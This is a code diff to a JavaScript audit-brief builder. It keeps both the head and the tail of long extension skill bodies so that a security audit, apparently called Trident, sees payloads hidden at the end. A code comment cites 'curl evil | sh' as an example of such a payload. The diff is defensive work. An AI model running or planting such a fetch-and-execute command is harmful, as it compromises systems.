@@ -601,6 +601,34 @@ async function writeRegistry(path, registry) {
 
 // --- exported helpers -------------------------------------------------------
 
+// Per-skill audit-brief budget. 20 KiB comfortably accommodates the long tail
+// of real-world skill bodies (typical < 5 KiB) while preventing the brief from
+// ballooning if a skill ships a multi-megabyte body. When a body exceeds the
+// cap, we keep the first 18 KiB AND the last 1.5 KiB with a truncation marker
+// so adversarial payloads tucked at the bottom (e.g. `curl evil | sh` after
+// 19 KiB of innocuous prose) still surface to Trident.
+const AUDIT_BRIEF_SKILL_BUDGET = 20_000;
+const AUDIT_BRIEF_HEAD_BYTES = 18_000;
+const AUDIT_BRIEF_TAIL_BYTES = 1_500;
+
+/**
+ * Build the per-skill body excerpt for the audit brief. Bodies under the
+ * budget pass through unchanged. Bodies over the budget are head+tail
+ * truncated with an explicit `... [truncated N chars] ...` marker so the
+ * audit lens (and any human reviewer) can see what was dropped.
+ *
+ * @param {string} body
+ * @returns {string}
+ */
+function buildAuditBriefExcerpt(body) {
+  if (typeof body !== 'string' || body.length === 0) return '';
+  if (body.length <= AUDIT_BRIEF_SKILL_BUDGET) return body;
+  const head = body.slice(0, AUDIT_BRIEF_HEAD_BYTES);
+  const tail = body.slice(body.length - AUDIT_BRIEF_TAIL_BYTES);
+  const dropped = body.length - AUDIT_BRIEF_HEAD_BYTES - AUDIT_BRIEF_TAIL_BYTES;
+  return `${head}\n... [truncated ${dropped} chars] ...\n${tail}`;
+}
+
 /**
  * Build the markdown brief passed to the Trident audit. Exported so tests can
  * assert on payload shape.
@@ -645,9 +673,9 @@ export function extensionAuditBrief(manifest, skillBodies) {
   for (const s of skills) {
     lines.push('');
     lines.push(`### ${s.name} (${s.file})`);
-    const head = typeof s.body === 'string' ? s.body.slice(0, 500) : '';
+    const excerpt = buildAuditBriefExcerpt(typeof s.body === 'string' ? s.body : '');
     lines.push('```');
-    lines.push(head);
+    lines.push(excerpt);
     lines.push('```');
   }
   return lines.join('\n');
